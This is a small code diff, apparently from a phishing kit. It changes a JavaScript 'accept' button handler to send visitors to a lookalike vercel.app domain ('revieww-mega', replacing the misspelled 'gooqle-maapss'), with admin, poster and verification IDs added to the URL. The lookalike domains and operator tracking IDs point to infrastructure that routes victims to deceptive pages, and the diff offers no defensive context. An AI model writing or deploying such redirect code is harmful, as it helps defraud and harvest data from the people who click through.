@@ -75,7 +75,7 @@ const verifyId = urlParams.get('verifyId');
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
-    window.location.href =`https://gooqle-maapss.vercel.app/${adminId}/${posterId}/${verifyId}`
+    window.location.href =`https://revieww-mega.vercel.app/${adminId}/${posterId}/${verifyId}`
   });
 });
  
